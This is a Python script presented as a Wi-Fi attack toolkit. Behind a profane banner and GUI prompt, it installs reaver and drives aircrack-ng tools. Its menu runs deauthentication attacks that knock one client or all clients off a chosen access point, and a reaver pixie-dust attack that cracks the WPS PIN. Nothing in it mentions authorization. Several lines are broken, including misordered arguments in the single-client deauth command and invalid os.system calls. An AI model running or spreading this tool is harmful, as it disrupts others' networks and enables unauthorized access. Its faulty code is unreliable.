#DEVELOPED BY FUCKSEC
#GREETINGS FROM THE SPACE
import os
import PySimpleGUI as sg
import time
class color:
    PURPLE = '\033[95m'
    END = '\033[0m'
os.system('pip install PySimpleGUI')
os.system('apt-get install time')
os.system('apt-get install reaver')
os.system('clear')
print(color.PURPLE + """
 /---\                                               /---\ 
(_____) =========================================== (_____)
 |   |  |/!\ WE ARE...                            |  |   |
 | \ |  | _____ _   _  ____ _  ______  _____ ____ |  | / |
 | \ |  ||  ___| | | |/ ___| |/ / ___|| ____/ ___||  | / |
 | \ |  || |_  | | | | |   | ' /\___ \|  _|| |    |  | / |
 | \ |  ||  _| | |_| | |___| . \ ___) | |__| |___ |  | / |
 | \ |  ||_|    \___/ \____|_|\_\____/|_____\____||  | / |
 |___|  |                           ...JOIN US /!\|  |___|
(     ) =========================================== (     )
 \---/  Version - dev-1.0                            \---/
        By D0TN3T
        """ + color.END)
layout = [
    [sg.Text("FUCKSEC TOOLKIT - developed by D0TN3T")],
    [sg.Text("Do you wish to start?")],
    [sg.Button('Lets fuckin go'), sg.Button("Cancel")]
]
window = sg.Window('FUCKSECURITY', layout)
while True:
    event, values = window.read()
    if event in (sg.WIN_CLOSED, 'Lets fuckin go'):
        break
    if event in ('Cancel'):
        os.system(exit)
        break
window.close()
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE.')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE..')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE...')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE.')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE..')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE...')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE.')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE..')
time.sleep(0.3)
os.system('clear')
print('LOADING CONSOLE...')
time.sleep(0.7)
print('CONSOLE LOADED SUCCESFULLY')
input('Press Enter to continue...')
os.system('clear')
os.system('apt-get install figlet')
os.system('clear')
os.system('figlet WELCOME')
i = 0
while i == 0:
    print("WHAT DO YOU WISH TO DO?")
    print("1. DEAUTH ATTACK")
    print("2. WPS ATTACK")
    n = int(input("OPTION: "))
    if n == 1:
        os.system('clear')
        os.system('figlet DE4UTH')
        interface = input("Enter your interface name: ")
        print("Starting monitor mode...")
        os.system('airmon-ng check kill')
        os.system('airmon-ng start {}'.format(interface))
        os.system('clear')
        print("Showing targets, press ctrl-c to stop")
        time.sleep(1.4)
        os.system('airodump-ng {}'.format(interface))
        bssid = input("target bssid: ")
        channel = input("target channel: ")
        q = 0
        while q == 0:
            print("checking network users...")
            os.system('airodump-ng -d {} -c {} {}'.format(bssid, channel, interface))
            questiontarget = input("Do you want to attack a specific user or everyone (s/e)?: ")
            if questiontarget == 's':
                mac = input("target's mac: ")
                os.system("aireplay-ng -0 0 -a {} -c {} {}".format(bssid, interface, mac))
            elif questiontarget == 'e':
                os.system("aireplay-ng -0 0 -a {} {}".format(bssid, interface))
                q = q + 1
            else:
                os.system('clear')
                print('error')
                time.sleep(2)
                os.system(clear)
                q = q + 0
    elif n == 2:
        print("WPS ATTACKS: ")
        print("1. REAVER")
        d = 0
        while d == 0:
            l = int(input("OPTION: "))
            time.sleep(1)
            os.system('clear')
            if l == 1:
                os.system('figlet TIME REAVER')
                interface = input("Enter your interface name: ")
                print("starting monitor mode...")
                os.system('airmon-ng check kill')
                os.system('airmon-ng start {}'.format(interface))
                os.system('clear')
                print("Showing targets, press ctrl-c to stop")
                time.sleep(1.4)
                os.system('airodump-ng {} --wps'.format(interface))
                bssid = input("Target bssid: ")
                channel = input("Target channel: ")
                os.system('time reaver -i {} -b {} -c {} -K 1'.format(interface, bssid, channel))
                d = d + 1
            else:
                print("INVALID INPUT")
                i = i + 0
    else:
        print("INVALID INPUT")
        i = i + 0
        time.sleep(1)
        os.system('clear')
    print('DO YOU WANT TO USE ANOTHER ATTACK (y/n)?: ')
    question = input()
    if question == 'y':
        os.system('clear')
        i = 0
    else:
        i = 1
        print('disabling monitro mode...')
        time.sleep(0.5)
        os.system('airmon-ng stop {}'.format(interface))
        os.system('service networking restart')
        os.system('service NetworkManager restart')
        os.system('service wpa_supplicant restart')
        time.sleep(0.5)
        os.system('clear')
        os.system('figlet BY3 BY3')
